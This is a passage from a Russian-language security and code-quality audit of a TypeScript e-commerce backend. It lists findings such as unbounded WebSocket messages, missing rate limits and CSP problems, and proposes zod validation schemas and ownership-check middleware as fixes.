- 1 –≥–æ–¥ = –æ–≥—Ä–æ–º–Ω–æ–µ –æ–∫–Ω–æ –¥–ª—è session hijacking

**–†–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-14.

---

### üü† HIGH-03: WebSocket - –Ω–µ—Ç –ª–∏–º–∏—Ç–∞ —Ä–∞–∑–º–µ—Ä–∞ —Å–æ–æ–±—â–µ–Ω–∏–π
**–§–∞–π–ª:** `server/routes.ts:153-180`  
**–°–µ—Ä—å—ë–∂–Ω–æ—Å—Ç—å:** HIGH

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
ws.on("message", async (data: any) => {
  try {
    // ...rate limiting...
    const message = JSON.parse(data.toString()); // ‚ùå –ù–ï–¢ –ü–†–û–í–ï–†–ö–ò –†–ê–ó–ú–ï–†–ê!
    // ...
  } catch (error) {
    logger.error("WebSocket message error", { error, userId });
  }
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –ù–µ—Ç –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –Ω–∞ —Ä–∞–∑–º–µ—Ä –≤—Ö–æ–¥—è—â–µ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
- –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –æ—Ç–ø—Ä–∞–≤–∏—Ç—å 100MB JSON ‚Üí DoS

**–†–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-15.

---

### üü† HIGH-04: WebSocket - –Ω–µ—Ç timeout –¥–ª—è idle connections
**–§–∞–π–ª:** `server/routes.ts:113-186`  
**–°–µ—Ä—å—ë–∂–Ω–æ—Å—Ç—å:** MEDIUM

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
wss.on("connection", async (ws: any, req: any) => {
  // ... authentication & setup
  
  ws.on("close", () => {
    connectedUsers.delete(userId);
    messageRateLimits.delete(userId);
  });
  // ‚ùå –ù–ï–¢ TIMEOUT –¥–ª—è idle connections!
  // ‚ùå –ù–ï–¢ PING-PONG –º–µ—Ö–∞–Ω–∏–∑–º–∞!
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- WebSocket —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –º–æ–≥—É—Ç –≤–∏—Å–µ—Ç—å –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ
- Memory leak –ø—Ä–∏ abandoned connections

**–†–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-16.

---

### üü† HIGH-05: ImagePipeline - Path Traversal –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ—Å–ª–µ path.join
**–§–∞–π–ª:** `server/ImagePipeline.ts:244-273`  
**–°–µ—Ä—å—ë–∂–Ω–æ—Å—Ç—å:** MEDIUM ‚Üí HIGH

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
async deleteImage(filename: string): Promise<void> {
  if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
    throw new Error('Invalid filename: path traversal detected');
  }
  
  const filePath = path.join(this.uploadsDir, filename); // ‚ùå JOIN –ü–ï–†–ï–î RESOLVE!
  const resolvedPath = path.resolve(filePath);
  const resolvedUploadsDir = path.resolve(this.uploadsDir);
  
  if (!resolvedPath.startsWith(resolvedUploadsDir + path.sep) && resolvedPath !== resolvedUploadsDir) {
    throw new Error('Path traversal attempt detected');
  }
  // ...
}
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –ü–æ—Ä—è–¥–æ–∫ –ø—Ä–æ–≤–µ—Ä–æ–∫ –Ω–µ–æ–ø—Ç–∏–º–∞–ª–µ–Ω
- `path.join` –º–æ–∂–µ—Ç normalize –ø—É—Ç—å –ø–µ—Ä–µ–¥ —Ñ–∏–Ω–∞–ª—å–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–æ–π

**–†–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-17.

---

### üü† HIGH-06: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –∏–Ω–¥–µ–∫—Å–∞ –Ω–∞ verificationToken
**–§–∞–π–ª:** `shared/schema.ts:21-35`  
**–°–µ—Ä—å—ë–∂–Ω–æ—Å—Ç—å:** MEDIUM ‚Üí HIGH –ø—Ä–∏ –º–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞–Ω–∏–∏

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  email: text("email").notNull().unique(),
  // ...
  verificationToken: text("verification_token"), // ‚ùå –ù–ï–¢ –ò–ù–î–ï–ö–°–ê!
  verificationTokenExpires: timestamp("verification_token_expires"),
  // ...
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –ü—Ä–∏ `/verify-email` –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è linear scan –µ—Å–ª–∏ –Ω–µ—Ç –∏–Ω–¥–µ–∫—Å–∞
- –ü—Ä–∏ 100K+ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π - –º–µ–¥–ª–µ–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã

**–†–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-18.

---

### üü† HIGH-07: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ rate limiting –Ω–∞ password change
**–§–∞–π–ª:** `server/routes/auth.routes.ts:238`  

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –ù–µ—Ç rate limiter –Ω–∞ `/password` endpoint
- –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–π DoS –∏–ª–∏ –±—Ä—É—Ç—Ñ–æ—Ä—Å —á–µ—Ä–µ–∑ —Å–º–µ–Ω—É –ø–∞—Ä–æ–ª—è

**–†–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-11 (–≤–∫–ª—é—á–∞–µ—Ç rate limiting).

---

### üü† HIGH-08: –ù–µ—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –ø–æ–∏—Å–∫–æ–≤–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞ –≤ support
**–§–∞–π–ª:** `server/routes/support.routes.ts:153-159`  

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
router.get("/closed-search", authenticateToken, requireRole("admin", "consultant"), async (req, res) => {
  const query = req.query.q as string; // ‚ùå –ë–ï–ó –í–ê–õ–ò–î–ê–¶–ò–ò!
  const closedConversations = await storage.searchClosedConversations({
    email: query,
  });
  res.json(closedConversations);
});
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- `query` –Ω–∞–ø—Ä—è–º—É—é –≤ SQL LIKE –∑–∞–ø—Ä–æ—Å
- –•–æ—Ç—è –µ—Å—Ç—å —Å–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏—è –≤ storage.ts:887, –ª—É—á—à–µ –≤–∞–ª–∏–¥–∏—Ä–æ–≤–∞—Ç—å –≤ route

**–†–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-19.

---

### üü† HIGH-09: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ Content-Security-Policy –≤ production
**–§–∞–π–ª:** `server/index.ts:22-37`  

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–π –∫–æ–¥:**
```typescript
app.use(helmet({
  contentSecurityPolicy: env.NODE_ENV === 'production' ? {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"], // ‚ùå –°–õ–û–ú–ê–ï–¢ Vite inline scripts!
      // ...
    },
  } : false,
}));
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- CSP —Å–ª–∏—à–∫–æ–º —Å—Ç—Ä–æ–≥–∏–π - —Å–ª–æ–º–∞–µ—Ç –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
- –ù–µ—Ç `report-uri` –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞

**–†–µ—à–µ–Ω–∏–µ:** –°–º. SOLUTION-20.

---

### üü† HIGH-10 –¥–æ HIGH-15: –û—Å—Ç–∞–ª—å–Ω—ã–µ –ø—Ä–æ–±–ª–µ–º—ã

**HIGH-10:** –ù–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞ duplicate WebSocket connections (server/routes.ts:144)  
**HIGH-11:** –ù–µ—Ç graceful shutdown –¥–ª—è SIGTERM (server/index.ts)  
**HIGH-12:** –ù–µ—Ç cleanup –¥–ª—è —Å—Ç–∞—Ä—ã—Ö unverified users  
**HIGH-13:** –ù–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ concurrent sessions  
**HIGH-14:** –ù–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ max —Ä–∞–∑–º–µ—Ä–∞ –∑–∞–∫–∞–∑–∞  
**HIGH-15:** Hardcoded business logic –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã –≤ –∫–æ–¥–µ

---

## –ß–ê–°–¢–¨ 3: –°–†–ï–î–ù–ò–ï –ò –ù–ò–ó–ö–ò–ï –ü–†–û–ë–õ–ï–ú–´

### üü° MEDIUM-01 –¥–æ MEDIUM-18

**MEDIUM-01:** –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–Ω—ã—Ö —Å–æ–±—ã—Ç–∏–π (IDOR attempts)  
**MEDIUM-02:** –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ MIME —á–µ—Ä–µ–∑ magic numbers (upload.ts)  
**MEDIUM-03:** console.log –≤–º–µ—Å—Ç–æ logger –≤ production  
**MEDIUM-04:** –ù–µ—Ç API versioning (/api/v1/...)  
**MEDIUM-05:** –ù–µ—Ç OpenAPI/Swagger –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏  
**MEDIUM-06:** –ù–µ—Ç unit —Ç–µ—Å—Ç–æ–≤  
**MEDIUM-07:** –ù–µ—Ç –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ (Sentry/Prometheus)  
**MEDIUM-08:** –ù–µ—Ç Redis –∫—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è  
**MEDIUM-09:** N+1 query –≤ getProducts (—É–∂–µ –æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–æ —á–∞—Å—Ç–∏—á–Ω–æ)  
**MEDIUM-10:** –ù–µ—Ç pagination –Ω–∞ wishlist/cart  
**MEDIUM-11:** Race condition –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ (duplicate email)  
**MEDIUM-12:** –ù–µ—Ç –∑–∞—â–∏—Ç—ã –æ—Ç % –∏ _ –≤ LIKE –∑–∞–ø—Ä–æ—Å–∞—Ö  
**MEDIUM-13:** –ù–µ—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–∏ JWT (—Ö–æ—Ç—è –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è sessions)  
**MEDIUM-14:** –ù–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ (jsonwebtoken)  
**MEDIUM-15:** 5 moderate npm vulnerabilities  
**MEDIUM-16:** –ù–µ—Ç GDPR/152-–§–ó compliance (delete account endpoint)  
**MEDIUM-17:** –ù–µ—Ç Privacy Policy/ToS API  
**MEDIUM-18:** XSS –≤ frontend (—Ç–æ–ª—å–∫–æ chart.tsx —Å dangerouslySetInnerHTML - –±–µ–∑–æ–ø–∞—Å–Ω–æ)

### üîµ LOW-01 –¥–æ LOW-09

**LOW-01:** Hardcoded magic numbers (365 * 24 * 60 * 60 * 1000)  
**LOW-02:** TypeScript strict mode - –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å noUnusedLocals  
**LOW-03:** –ù–µ—Ç error boundaries –≤ React  
**LOW-04:** –ù–µ—Ç healthcheck —Å DB –ø—Ä–æ–≤–µ—Ä–∫–æ–π  
**LOW-05:** –ù–µ—Ç Request ID —Ç—Ä–∞—Å—Å–∏—Ä–æ–≤–∫–∏ (—É–∂–µ –µ—Å—Ç—å)  
**LOW-06:** –ú–æ–¥—É–ª—å–Ω–∞—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ incomplete (WebSocket broadcasts)  
**LOW-07:** Storage layer —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π (945 —Å—Ç—Ä–æ–∫)  
**LOW-08:** –ù–µ—Ç DTO —Å–ª–æ—è  
**LOW-09:** Business logic –≤ route handlers

---

## –ß–ê–°–¢–¨ 4: –¶–ï–ù–¢–†–ê–õ–ò–ó–û–í–ê–ù–ù–´–ï –†–ï–®–ï–ù–ò–Ø

### ‚úÖ SOLUTION-01: –¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è –¥–ª—è Orders

**–°–æ–∑–¥–∞—Ç—å:** `shared/schema.ts` (–¥–æ–±–∞–≤–∏—Ç—å)

```typescript
// shared/schema.ts

export const createOrderItemSchema = z.object({
  productId: z.string().uuid("–ù–µ–≤–µ—Ä–Ω—ã–π ID —Ç–æ–≤–∞—Ä–∞"),
  name: z.string().min(1).max(500),
  price: z.string().regex(/^\d+(\.\d{1,2})?$/, "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Ü–µ–Ω—ã"),
  quantity: z.number()
    .int("–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —Ü–µ–ª—ã–º —á–∏—Å–ª–æ–º")
    .min(1, "–ú–∏–Ω–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ: 1")
    .max(1000, "–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ: 1000"), // ‚úÖ –î–û–ë–ê–í–ò–¢–¨ MAX!
  discount: z.string().regex(/^\d+(\.\d{1,2})?$/).optional(),
});

export const createOrderSchema = z.object({
  items: z.array(createOrderItemSchema)
    .min(1, "–ó–∞–∫–∞–∑ –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ö–æ—Ç—è –±—ã –æ–¥–∏–Ω —Ç–æ–≤–∞—Ä")
    .max(50, "–ú–∞–∫—Å–∏–º—É–º 50 —Ç–æ–≤–∞—Ä–æ–≤ –≤ –∑–∞–∫–∞–∑–µ"), // ‚úÖ –õ–ò–ú–ò–¢ –Ω–∞ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ
  
  deliveryService: z.enum(['cdek', 'boxberry'], {
    errorMap: () => ({ message: "–ù–µ–≤–µ—Ä–Ω–∞—è —Å–ª—É–∂–±–∞ –¥–æ—Å—Ç–∞–≤–∫–∏" })
  }),
  deliveryType: z.enum(['pvz', 'postamat', 'courier'], {
    errorMap: () => ({ message: "–ù–µ–≤–µ—Ä–Ω—ã–π —Ç–∏–ø –¥–æ—Å—Ç–∞–≤–∫–∏" })
  }),
  deliveryPointCode: z.string().max(100).optional(),
  deliveryAddress: z.object({
    city: z.string().min(1).max(200),
    street: z.string().min(1).max(300),
    building: z.string().min(1).max(50),
    apartment: z.string().max(20).optional(),
    postalCode: z.string().regex(/^\d{6}$/, "–ò–Ω–¥–µ–∫—Å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å 6 —Ü–∏—Ñ—Ä"),
  }).optional(),
  
  deliveryCost: z.string().regex(/^\d+(\.\d{1,2})?$/, "–ù–µ–≤–µ—Ä–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å –¥–æ—Å—Ç–∞–≤–∫–∏"),
  
  paymentMethod: z.enum(['online', 'on_delivery'], {
    errorMap: () => ({ message: "–ù–µ–≤–µ—Ä–Ω—ã–π –º–µ—Ç–æ–¥ –æ–ø–ª–∞—Ç—ã" })
  }),
  
  promocodeCode: z.string().max(50).optional(),
  useBonuses: z.boolean().default(false),
});
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤:** `server/routes/orders.routes.ts`

```typescript
router.post("/", authenticateToken, orderLimiter, async (req, res) => {
  // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø –°–ù–ê–ß–ê–õ–ê!
  const data = createOrderSchema.parse(req.body);
  
  // –¢–µ–ø–µ—Ä—å data.items[].quantity –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ 1-1000
  // ...–æ—Å—Ç–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞
});
```

**–û–±–Ω–æ–≤–∏—Ç—å raw SQL:**
```typescript
// –í —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:
for (const item of data.items) {
  // ‚úÖ –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ (defence in depth)
  if (!Number.isInteger(item.quantity) || item.quantity < 1 || item.quantity > 1000) {
    throw new Error('Invalid quantity value');
  }
  
  // –¢–µ–ø–µ—Ä—å –±–µ–∑–æ–ø–∞—Å–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å
  const updateResult = await tx.execute(
    sql`UPDATE products 
        SET stock_quantity = stock_quantity - ${item.quantity},
            updated_at = NOW()
        WHERE id = ${item.productId}
          AND stock_quantity >= ${item.quantity}`
  );
  // ...
}
```

---

### ‚úÖ SOLUTION-02: –¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ ownership

**–£–ª—É—á—à–∏—Ç—å:** `server/middleware/resourceOwnership.ts`

```typescript
// server/middleware/resourceOwnership.ts

import { Request, Response, NextFunction } from "express";
import { storage } from "../storage";

// ‚úÖ –û–ë–û–ë–©–Å–ù–ù–ê–Ø —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ ownership
export function requireOwnership<T extends { userId: string }>(
  fetchResource: (id: string) => Promise<T | undefined>,
  resourceName: string
) {
  return async (req: Request, res: Response, next: NextFunction) => {
    try {
      const resource = await fetchResource(req.params.id);
      
      if (!resource) {
        // ‚úÖ 404 –≤–º–µ—Å—Ç–æ 403 —á—Ç–æ–±—ã –Ω–µ —Ä–∞—Å–∫—Ä—ã–≤–∞—Ç—å —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏–µ —Ä–µ—Å—É—Ä—Å–∞
        return res.status(404).json({ message: `${resourceName} –Ω–µ –Ω–∞–π–¥–µ–Ω` });
      }
      
      // ‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤
      const userRoles = req.userRoles || [];
      const isAdmin = userRoles.includes('admin');
      
      if (resource.userId !== req.userId && !isAdmin) {
        // ‚úÖ 404 –≤–º–µ—Å—Ç–æ 403 (security by obscurity)
        return res.status(404).json({ message: `${resourceName} –Ω–µ –Ω–∞–π–¥–µ–Ω` });
      }
      
      // ‚úÖ –°–æ—Ö—Ä–∞–Ω–∏—Ç—å —Ä–µ—Å—É—Ä—Å –≤ req –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ handler
      (req as any).resource = resource;
      next();
    } catch (error) {
      next(error);
    }
  };
}

// ‚úÖ –°–ü–ï–¶–ò–ê–õ–ò–ó–ò–†–û–í–ê–ù–ù–ê–Ø –¥–ª—è Orders (—Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π admin/consultant)
export function requireOrderOwnership() {
  return async (req: Request, res: Response, next: NextFunction) => {
    try {
      const order = await storage.getOrder(req.params.id);
      
      if (!order) {
        return res.status(404).json({ message: "–ó–∞–∫–∞–∑ –Ω–µ –Ω–∞–π–¥–µ–Ω" });
      }
      
      const userRoles = req.userRoles || [];
      const isAdmin = userRoles.includes('admin');
      const isConsultant = userRoles.includes('consultant');
      
      // ‚úÖ Admin –∏ consultant –º–æ–≥—É—Ç –≤–∏–¥–µ—Ç—å –≤—Å–µ –∑–∞–∫–∞–∑—ã
      if (order.userId !== req.userId && !isAdmin && !isConsultant) {
        return res.status(404).json({ message: "–ó–∞–∫–∞–∑ –Ω–µ –Ω–∞–π–¥–µ–Ω" });
      }
      
      (req as any).order = order;
      next();
    } catch (error) {
      next(error);
    }
  };
}
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**
```typescript
// server/routes/orders.routes.ts
router.get("/:id", authenticateToken, requireOrderOwnership(), async (req, res) => {
  const order = (req as any).order; // ‚úÖ –£–∂–µ –ø—Ä–æ–≤–µ—Ä–µ–Ω middleware
  res.json(order);
});
```

---

### ‚úÖ SOLUTION-03: –í–∞–ª–∏–¥–∞—Ü–∏—è –¥–ª—è Categories

**–î–æ–±–∞–≤–∏—Ç—å –≤:** `shared/schema.ts`

```typescript
export const createCategorySchema = z.object({
  name: z.string()
    .min(1, "–ù–∞–∑–≤–∞–Ω–∏–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ")
    .max(200, "–ù–∞–∑–≤–∞–Ω–∏–µ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–æ–µ")
    .regex(/^[–∞-—è–ê-–Ø—ë–Åa-zA-Z0-9\s\-,()]+$/, "–ù–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–µ —Å–∏–º–≤–æ–ª—ã –≤ –Ω–∞–∑–≤–∞–Ω–∏–∏"),
  
  slug: z.string()
    .min(1, "Slug –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω")
    .max(200, "Slug —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π")
    .regex(/^[a-z0-9\-]+$/, "Slug –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Å—Ç—Ä–æ—á–Ω—ã–µ –ª–∞—Ç–∏–Ω—Å–∫–∏–µ –±—É–∫–≤—ã, —Ü–∏—Ñ—Ä—ã –∏ –¥–µ—Ñ–∏—Å—ã"),
  
  description: z.string()
    .max(2000, "–û–ø–∏—Å–∞–Ω–∏–µ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–æ–µ")
    .optional()
    .transform(val => val?.trim() || null),
  
  sortOrder: z.number()
    .int("sortOrder –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ü–µ–ª—ã–º —á–∏—Å–ª–æ–º")
    .min(0, "sortOrder –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–º")
    .max(9999, "sortOrder —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π")
    .default(0),
});

export const updateCategorySchema = createCategorySchema.partial();
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**
```typescript
// server/routes/categories.routes.ts
import { createCategorySchema, updateCategorySchema } from "@shared/schema";

router.post("/", authenticateToken, requireRole("admin", "marketer"), async (req, res) => {
  const data = createCategorySchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!
  
  const category = await storage.createCategory({
    name: data.name,
    slug: data.slug,
    description: data.description || null,
    sortOrder: data.sortOrder,
  });

  res.json(category);
});

router.put("/:id", authenticateToken, requireRole("admin", "marketer"), async (req, res) => {
  const data = updateCategorySchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!
  
  const category = await storage.updateCategory(req.params.id, data);
  res.json(category);
});
```

---

### ‚úÖ SOLUTION-04: –í–∞–ª–∏–¥–∞—Ü–∏—è –¥–ª—è Promocodes

**–î–æ–±–∞–≤–∏—Ç—å –≤:** `shared/schema.ts`

```typescript
export const validatePromocodeSchema = z.object({
  code: z.string()
    .min(1, "–ü—Ä–æ–º–æ–∫–æ–¥ –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω")
    .max(50, "–ü—Ä–æ–º–æ–∫–æ–¥ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π")
    .regex(/^[A-Z0-9\-]+$/, "–ü—Ä–æ–º–æ–∫–æ–¥ –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ –∑–∞–≥–ª–∞–≤–Ω—ã–µ –±—É–∫–≤—ã, —Ü–∏—Ñ—Ä—ã –∏ –¥–µ—Ñ–∏—Å—ã"),
  
  orderAmount: z.string()
    .regex(/^\d+(\.\d{1,2})?$/, "–ù–µ–≤–µ—Ä–Ω–∞—è —Å—É–º–º–∞ –∑–∞–∫–∞–∑–∞")
    .transform(val => parseFloat(val))
    .refine(val => val > 0, "–°—É–º–º–∞ –∑–∞–∫–∞–∑–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–π"),
});

export const createPromocodeSchema = z.object({
  code: z.string()
    .min(1, "–ü—Ä–æ–º–æ–∫–æ–¥ –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω")
    .max(50, "–ü—Ä–æ–º–æ–∫–æ–¥ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π")
    .regex(/^[A-Z0-9\-]+$/, "–ü—Ä–æ–º–æ–∫–æ–¥ –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ –∑–∞–≥–ª–∞–≤–Ω—ã–µ –±—É–∫–≤—ã, —Ü–∏—Ñ—Ä—ã –∏ –¥–µ—Ñ–∏—Å—ã")
    .transform(val => val.toUpperCase()),
  
  discountPercentage: z.string()
    .regex(/^\d+(\.\d{1,2})?$/, "–ù–µ–≤–µ—Ä–Ω—ã–π –ø—Ä–æ—Ü–µ–Ω—Ç —Å–∫–∏–¥–∫–∏")
    .transform(val => {
      const num = parseFloat(val);
      if (num <= 0 || num > 100) throw new Error("–°–∫–∏–¥–∫–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç 0.01 –¥–æ 100");
      return val;
    }),
  
  minOrderAmount: z.string()
    .regex(/^\d+(\.\d{1,2})?$/, "–ù–µ–≤–µ—Ä–Ω–∞—è –º–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞")
    .default("0"),
  
  maxDiscountAmount: z.string()
    .regex(/^\d+(\.\d{1,2})?$/, "–ù–µ–≤–µ—Ä–Ω–∞—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å–∫–∏–¥–∫–∏")
    .optional()
    .nullable(),
  
  type: z.enum(['single_use', 'temporary'], {
    errorMap: () => ({ message: "–ù–µ–≤–µ—Ä–Ω—ã–π —Ç–∏–ø –ø—Ä–æ–º–æ–∫–æ–¥–∞" })
  }),
  
  expiresAt: z.string()
    .datetime({ message: "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –¥–∞—Ç—ã" })
    .transform(val => new Date(val))
    .optional()
    .nullable(),
  
  isActive: z.boolean().default(true),
});

export const updatePromocodeSchema = createPromocodeSchema.partial();
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**
```typescript
// server/routes/promocodes.routes.ts
import { validatePromocodeSchema, createPromocodeSchema, updatePromocodeSchema } from "@shared/schema";

router.post("/validate", authenticateToken, promocodeValidationLimiter, async (req, res) => {
  const data = validatePromocodeSchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!
  const result = await validatePromocode(data.code, req.userId!, data.orderAmount);
  res.json(result);
});

router.post("/", authenticateToken, requireRole("admin", "marketer"), async (req, res) => {
  const data = createPromocodeSchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!
  const promocode = await storage.createPromocode(data);
  res.json(promocode);
});

router.put("/:id", authenticateToken, requireRole("admin", "marketer"), async (req, res) => {
  const data = updatePromocodeSchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!
  const promocode = await storage.updatePromocode(req.params.id, data);
  res.json(promocode);
});
```

---

### ‚úÖ SOLUTION-05: –í–∞–ª–∏–¥–∞—Ü–∏—è –¥–ª—è Support Messages

**–î–æ–±–∞–≤–∏—Ç—å –≤:** `shared/schema.ts`

```typescript
export const createSupportMessageSchema = z.object({
  messageText: z.string()
    .min(1, "–°–æ–æ–±—â–µ–Ω–∏–µ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º")
    .max(10000, "–°–æ–æ–±—â–µ–Ω–∏–µ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–æ–µ")
    .transform(val => val.trim()),
  
  userId: z.string()
    .uuid("–ù–µ–≤–µ—Ä–Ω—ã–π ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è")
    .optional(), // –¢–æ–ª—å–∫–æ –¥–ª—è admin/consultant
});
```

